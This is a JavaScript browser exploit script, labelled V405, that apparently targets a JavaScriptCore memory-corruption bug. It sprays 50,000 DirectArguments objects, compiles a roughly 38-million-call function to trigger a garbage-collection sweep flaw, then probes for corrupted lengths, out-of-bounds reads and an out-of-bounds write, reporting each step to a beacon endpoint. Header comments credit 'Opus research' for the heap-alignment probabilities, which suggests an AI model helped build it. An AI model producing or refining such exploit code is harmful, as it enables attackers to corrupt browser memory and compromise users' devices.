// V405 - DirectArguments sweep: NO PRE-MAP (V378 proved sweep runs fine without it)
// V404 crashed because pre-map cycling ate memory, OOMing during parse.
// Opus research: size class 112 matches sweep stride. P(alignment per block) = 25%.
// 50K args = 350 blocks -> P(>=1 hit) = 1 - 0.75^350 > 99.99%.
// m_length at cell+32. Sweep writes: 0-11(zeros), 24-31(thunk ptr), 64-67(bits), 68-71(bytecodeIndex).

(function() {
  'use strict';
  var qc = 0;
  function B(m) {
    new Image().src = '/beacon/V405-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++);
  }

  B('START');

  // ===== PHASE 1: Spray DirectArguments (size class 112) =====
  var SPRAY_COUNT = 50000;
  var argStore = [];

  function makeArgs(a, b, c, d, e, f, g) {
    return arguments;
  }

  for (var i = 0; i < SPRAY_COUNT; i++) {
    argStore.push(makeArgs(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47));
  }
  B('SPRAY-' + argStore.length);

  // Verify a sample
  var sprayOK = 0;
  for (var i = 0; i < Math.min(100, argStore.length); i++) {
    if (argStore[i].length === 7 && argStore[i][0] === 0x41 && argStore[i][6] === 0x47) {
      sprayOK++;
    }
  }
  B('VERIFY-' + sprayOK + 'of100');

  // ===== PHASE 2: Build IIFE =====
  B('BUILD');

  // Build 38,348,816 op_call instructions using array join (not +=)
  var piece = '';
  for (var i = 0; i < 1000; i++) piece += 'a();';
  // piece = 4000 chars, need ceil(38348816/1000) = 38349 copies
  var needed = Math.ceil(38348816 / 1000);
  var parts = new Array(needed);
  for (var i = 0; i < needed; i++) parts[i] = piece;
  var calls = parts.join('');
  parts = null;
  piece = null;
  B('CALLS-' + calls.length);

  var code = '(function(a){if(window.____xV405){' + calls + '}})(function(){})';
  calls = null;
  B('CODE-' + code.length);

  try {
    var blob = new Blob([code], { type: 'application/javascript' });
    code = null;
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');

    var url = URL.createObjectURL(blob);
    var s = document.createElement('script');
    s.src = url;
    s.onload = function() {
      B('COMPILED-OK');
      URL.revokeObjectURL(url);
      checkCorruption();
    };
    s.onerror = function(e) {
      B('COMPILED-ERR');
      checkCorruption();
    };
    document.head.appendChild(s);
  } catch(e) {
    B('BUILD-ERR-' + e.message.substring(0, 80));
    checkCorruption();
  }

  // ===== PHASE 3: Check DirectArguments corruption =====
  function checkCorruption() {
    B('CHECK');
    var corrupted = 0;
    var oobReads = 0;
    var valCorrupted = 0;
    var firstCorruptIdx = -1;

    for (var i = 0; i < argStore.length; i++) {
      var args = argStore[i];

      // m_length corruption check
      if (args.length !== 7) {
        if (firstCorruptIdx === -1) firstCorruptIdx = i;
        corrupted++;
        var newLen = args.length;

        // Report first 30 corrupted
        if (corrupted <= 30) {
          B('C-' + i + '-L' + newLen);
        }

        // OOB read if length became larger
        if (newLen > 7 && newLen < 1000000) {
          oobReads++;
          if (oobReads <= 10) {
            var vals = [];
            var limit = Math.min(newLen, 20);
            for (var j = 7; j < limit; j++) {
              try {
                var v = args[j];
                if (typeof v === 'number') {
                  vals.push(j + 'n' + (v >>> 0).toString(16));
                } else if (typeof v === 'object' && v !== null) {
                  vals.push(j + 'o');
                } else if (v === undefined) {
                  vals.push(j + 'u');
                } else {
                  vals.push(j + typeof v[0]);
                }
              } catch(e) {
                vals.push(j + 'E');
              }
            }
            B('OOB-' + i + '-' + vals.join('|'));
          }

          // OOB write test on first hit
          if (oobReads === 1 && newLen > 20) {
            try {
              args[10] = 0xDEAD;
              if (args[10] === 0xDEAD) {
                B('WRITE-OK-' + i);
              } else {
                B('WRITE-DIFF-' + i + '-' + args[10]);
              }
            } catch(e) {
              B('WRITE-ERR-' + i);
            }
          }
        }

        // m_length zeroed (sweep wrote zeros at entry+0..11)
        if (newLen === 0) {
          if (corrupted <= 5) B('ZEROED-' + i);
        }

      } else {
        // Value corruption: sweep wrote into inline storage
        if (args[0] !== 0x41 || args[6] !== 0x47) {
          valCorrupted++;
          if (valCorrupted <= 10) {
            B('VC-' + i + '-' + args[0] + '|' + args[6]);
          }
        }
      }
    }

    B('RESULT-C' + corrupted + '-O' + oobReads + '-V' + valCorrupted + '-T' + argStore.length);
    if (firstCorruptIdx >= 0) {
      B('FIRST-' + firstCorruptIdx);
    }
    B('DONE');
  }

})();
